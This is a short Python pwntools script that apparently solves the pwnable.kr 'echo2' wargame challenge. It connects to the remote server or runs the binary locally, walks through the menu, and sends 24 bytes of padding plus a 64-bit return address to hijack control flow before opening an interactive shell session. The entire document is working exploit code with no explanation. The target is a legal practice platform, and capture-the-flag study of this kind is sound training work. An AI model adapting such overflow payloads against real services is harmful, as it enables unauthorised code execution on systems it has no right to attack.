from pwn import *
import sys

def main():
    if(sys.argv[1] == "remote"):
        print("Attacking Server!")
        p = remote("pwnable.kr",9011)
    else:
        print("Running Locally")
        p = process("./echo2")
        
    # Inputs setup
    name = b"Gio"
    target_addr = p64(0x00400818)
    payload = b"A" *24 + target_addr

    # Process interaction
    p.sendline(name)
    p.sendline(b"4")
    p.sendline(b"n")
    p.sendline(b"3")
    p.sendline(payload)
    p.interactive()
    # gdb.attach(p)

if __name__=="__main__":
    main()
